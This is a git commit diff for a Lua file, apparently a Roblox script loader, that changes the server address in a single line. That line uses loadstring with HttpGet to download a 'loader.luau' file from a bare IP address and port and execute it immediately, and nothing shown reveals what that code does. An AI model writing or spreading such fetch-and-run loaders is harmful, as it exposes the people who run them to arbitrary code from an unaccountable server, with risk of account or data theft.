b33817cc607a07b34bbb41cb9b2a11c88ba26b66
WonyeScripts <alikeremkanbur74@icloud.com>
2025-11-02 20:53:16 +0300

    Update mainn.lua

--- mainn.lua
+++ mainn.lua
@@ -1,2 +1,2 @@
 ID="9f5bc6e9-6854-41af-a91d-02135693fff9";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
